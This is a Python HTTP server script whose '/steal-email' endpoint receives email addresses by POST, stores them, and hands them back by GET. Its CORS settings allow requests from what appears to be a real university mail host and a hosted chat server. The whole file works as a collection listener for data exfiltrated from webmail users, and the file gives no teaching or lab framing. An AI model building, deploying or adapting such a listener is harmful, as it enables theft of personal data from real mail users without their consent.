import http.server
import socketserver
import urllib.parse
import sys
import json
import logging
from datetime import datetime
import socket

# Configuration
PORT = 3001
ALLOWED_ORIGINS = [
    "http://localhost:4000",
    "https://mail1.cselab.nitrkl.in",
    "https://chat-server-l5ni.onrender.com"
]
EMAIL_STORAGE = {}  # Store the email

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'server_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def send_cors_headers(self):
        """Add CORS and security headers to the response."""
        origin = self.headers.get('Origin', '')
        if origin in ALLOWED_ORIGINS:
            self.send_header("Access-Control-Allow-Origin", origin)
        else:
            self.send_header("Access-Control-Allow-Origin", ALLOWED_ORIGINS[0])
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("Content-Security-Policy", "default-src 'none'")

    def do_GET(self):
        """Handle GET requests for /steal-email or query parameters."""
        try:
            parsed_path = urllib.parse.urlparse(self.path)
            if parsed_path.path == "/steal-email":
                logger.info("Handling GET /steal-email")
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                response = {
                    "status": "success",
                    "email": EMAIL_STORAGE.get("email", "No email stored")
                }
                logger.info(f"Returning email: {response['email']}")
                print(f"GET /steal-email - Email: {response['email']}")
                self.wfile.write(json.dumps(response).encode('utf-8'))
                return

            query_params = urllib.parse.parse_qs(parsed_path.query)
            if query_params:
                logger.info(f"Received GET data: {query_params}")
            else:
                logger.info("Received GET request with no query parameters")

            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.send_cors_headers()
            self.end_headers()
            response = {
                "status": "success",
                "message": "No data",
                "received_data": query_params
            }
            self.wfile.write(json.dumps(response).encode('utf-8'))

        except Exception as e:
            logger.error(f"Error processing GET request: {e}")
            self.send_response(500)
            self.send_header("Content-type", "application/json")
            self.send_cors_headers()
            self.end_headers()
            response = {"status": "error", "message": f"Server error: {str(e)}"}
            self.wfile.write(json.dumps(response).encode('utf-8'))

    def do_POST(self):
        """Handle POST requests to receive and store email data."""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length <= 0:
                logger.warning("No data received in POST request")
                self.send_response(400)
                self.send_header("Content-type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                response = {"status": "error", "message": "No data provided"}
                self.wfile.write(json.dumps(response).encode('utf-8'))
                return

            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                if self.path == "/steal-email":
                    email = data.get('email', 'No email provided')
                    logger.info(f"Received POST email: {email}")
                    print(f"POST /steal-email - Email: {email}")
                    EMAIL_STORAGE["email"] = email  # Store the email
                    response = {
                        "status": "success",
                        "message": "Email data received",
                        "email": email
                    }
                else:
                    logger.warning(f"Invalid POST endpoint: {self.path}")
                    self.send_response(400)
                    self.send_header("Content-type", "application/json")
                    self.send_cors_headers()
                    self.end_headers()
                    response = {"status": "error", "message": "Invalid endpoint"}
                    self.wfile.write(json.dumps(response).encode('utf-8'))
                    return

                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(json.dumps(response).encode('utf-8'))

            except json.JSONDecodeError:
                logger.warning("Invalid JSON data received")
                self.send_response(400)
                self.send_header("Content-type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                response = {"status": "error", "message": "Invalid JSON data"}
                self.wfile.write(json.dumps(response).encode('utf-8'))

        except Exception as e:
            logger.error(f"Error handling POST request: {e}")
            self.send_response(500)
            self.send_header("Content-type", "application/json")
            self.send_cors_headers()
            self.end_headers()
            response = {"status": "error", "message": f"Server error: {str(e)}"}
            self.wfile.write(json.dumps(response).encode('utf-8'))

    def do_OPTIONS(self):
        """Handle CORS preflight requests."""
        try:
            self.send_response(200)
            self.send_cors_headers()
            self.end_headers()
            logger.info("Handled OPTIONS preflight request")
        except Exception as e:
            logger.error(f"Error handling OPTIONS request: {e}")
            self.send_response(500)
            self.send_cors_headers()
            self.end_headers()

    def log_message(self, format, *args):
        """Override default logging to use custom logger."""
        logger.info(f"Request: {format % args}")

def check_port(port):
    """Check if the specified port is available."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(("", port))
            return True
        except socket.error:
            return False

def run_server():
    """Start the HTTP server."""
    try:
        if not check_port(PORT):
            logger.error(f"Port {PORT} is already in use. Please free the port or choose another.")
            sys.exit(1)

        with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
            logger.info(f"Server running on port {PORT}")
            logger.info(f"Listening at http://localhost:{PORT}")
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                logger.info("Server stopped by user (Ctrl+C)")
                httpd.server_close()
                sys.exit(0)
    except Exception as e:
        logger.error(f"Failed to start server: {e}")
        sys.exit(1)

if __name__ == "__main__":
    run_server()